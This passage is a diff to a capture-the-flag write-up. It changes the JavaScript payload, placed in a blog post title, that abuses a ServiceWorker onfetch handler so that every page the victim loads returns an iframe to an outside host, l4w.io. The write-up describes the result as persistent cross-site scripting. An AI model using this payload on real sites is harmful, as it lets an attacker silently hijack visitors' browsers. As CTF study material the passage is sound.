@@ -45,7 +45,7 @@ To bypass it, create a blog post with title like:
 
 In [solve.py](solve.py), I have been using as the following:
 ```javascript
-`;onfetch=(e)=>{e.respondWith(new Response('<iframe src=//l4w.io>',{headers:{'Content-Type':'text/html'}}))}//
+`({"data":"QQ==","id":"[blog_post_id]","title":"`;onfetch=(e)=>{e.respondWith(new Response('<iframe src=//l4w.io>',{headers:{'Content-Type':'text/html'}}))}//","time":"2018-04-03 12:32:00","image_type":""});
 ```
 
 To setup ServiceWorker later then get persistent XSS (Imagine that, from now on, victim always get into your evil page, then you can silently control the pages).
